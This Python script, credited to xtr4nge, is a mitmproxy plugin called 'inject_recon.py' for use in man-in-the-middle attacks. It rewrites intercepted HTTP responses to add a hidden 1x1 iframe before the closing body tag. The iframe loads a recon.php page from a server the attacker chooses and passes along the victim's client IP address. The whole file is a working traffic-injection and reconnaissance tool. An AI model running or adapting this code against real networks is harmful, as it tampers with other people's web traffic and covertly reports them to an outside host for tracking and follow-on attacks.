#!/usr/bin/env python

# Copyright (C) 2015-2016 xtr4nge [_AT_] gmail.com
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#

# Usage: mitmdump -s "inject_recon.py server"
# (this script works best with --anticache)

try:
    from mitmproxy import controller, proxy # mitmproxy 0.17
    from mitmproxy.proxy.server import ProxyServer # mitmproxy 0.17
    from mitmproxy.models import decoded # mitmproxy 0.17
except:
    from libmproxy import controller, proxy # mitmproxy 0.15
    from libmproxy.proxy.server import ProxyServer # mitmproxy 0.15
    from libmproxy.models import decoded # mitmproxy 0.15

def start(context, argv):
	if len(argv) != 2:
		raise ValueError('Usage: -s "inject_recon.py server"')
	# You may want to use Python's argparse for more sophisticated argument parsing.
	context.server = argv[1]


def response(context, flow):
	with decoded(flow.response):  # automatically decode gzipped responses.
		
		client_conn = str(flow.client_conn)
		server_conn = str(flow.client_conn)
	
		client_conn = client_conn.split(" ")[1]
		client_conn = client_conn.split(":")[0]

		inject_recon = "\n<iframe src='http://"+context.server+"/recon/recon.php?client_conn="+client_conn+"' height='1' width='1' style='display:none'></iframe>\n"

		flow.response.content = flow.response.content.replace("</body>", inject_recon + "</body>")
		flow.response.content = flow.response.content.replace("client_conn_xxx_xxx_xxx_xxx", client_conn)
